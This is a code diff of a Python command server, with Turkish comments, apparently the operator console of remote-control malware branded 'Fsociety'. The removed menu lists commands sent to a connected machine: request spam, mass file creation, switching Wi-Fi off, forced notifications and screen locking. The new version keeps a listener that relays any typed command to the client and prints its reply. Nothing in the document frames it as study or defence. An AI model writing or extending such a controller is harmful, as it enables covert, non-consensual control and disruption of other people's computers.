@@ -2,57 +2,33 @@ import socket
 import argparse
 
 parser = argparse.ArgumentParser()
-parser.add_argument("-p", "--port", type=int, default=5000, help="Dinlenecek port")
+parser.add_argument("-p", "--port", type=int, required=True, help="Port numarası")
 args = parser.parse_args()
 
-ip = "0.0.0.0"
+host = "0.0.0.0"
 port = args.port
 
 s = socket.socket()
-s.bind((ip, port))
+s.bind((host, port))
 s.listen(1)
+print(f"[+] Dinleniyor: {host}:{port}")
 
-print(f"[+] Dinleniyor: {ip}:{port}")
-client, addr = s.accept()
-print(f"[+] Bağlandı: {addr}")
-
-def menu():
-    print(f"""
-╔════════════════════════════════════════════╗
-║          Fsociety Server Paneli           ║
-║------------------------------------------║
-║ Komutlar:                                 ║
-║ - spam-istek <sayi>   (Max 1000)          ║
-║ - olustur-dosya <sayi> (Max 100)          ║
-║ - youtube <link>                          ║
-║ - wifi-off                                ║
-║ - sound local                             ║
-║ - bildirim "Başlık" "İçerik"              ║
-║ - bildirim-say                            ║
-║ - kilit                                   ║
-║ - exit                                    ║
-╚════════════════════════════════════════════╝
-""")
-
-menu()
+client, adres = s.accept()
+print(f"[+] Bağlandı: {adres[0]}:{adres[1]}")
 
 while True:
     try:
         komut = input("Komut >> ").strip()
         if not komut:
             continue
-
         client.send(komut.encode())
-
-        if komut == "exit":
-            print("[✓] Bağlantı sonlandırıldı.")
-            break
-
         cevap = client.recv(4096).decode()
-        print(f"[📥] Cevap:\n{cevap}")
-
+        print(f"\n{cevap}\n")
     except KeyboardInterrupt:
-        print("\n[!] Sunucu durduruldu.")
-        client.send(b"exit")
+        print("\n[!] Bağlantı kapatılıyor...")
+        client.send("exit".encode())
         client.close()
+        break
+    except Exception as e:
+        print(f"[X] Hata: {str(e)}")
         break
